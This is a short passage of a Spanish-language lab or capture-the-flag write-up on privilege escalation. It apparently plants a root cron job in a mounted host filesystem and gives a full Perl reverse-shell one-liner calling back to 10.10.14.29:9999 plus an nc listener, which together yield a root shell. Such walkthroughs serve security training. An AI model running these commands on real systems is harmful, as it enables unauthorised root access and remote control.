## Privilege Escalation {-}

### Rootear la maquina (ganar accesso al systema completo){-}

```bash
cd /mnt/test/etc/cron.d
ls
echo '* * * * * root sh /tmp/reverse.sh' > tarea
cd ..
cd ..
cd tmp
```

creamos una reverse shell con perl

```bash
perl -e 'use Socket;$i="10.10.14.29";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

y la enviamos al contenedor con base64 en el directorio /mnt/test/tmp/ como reverse.sh

```bash
chmod +x reverse.sh
```

nos ponemos en escucha por el puerto 9999

```bash
nc -nlvp 9999
```

ya ganamos acceso a la maquina victima real como root.
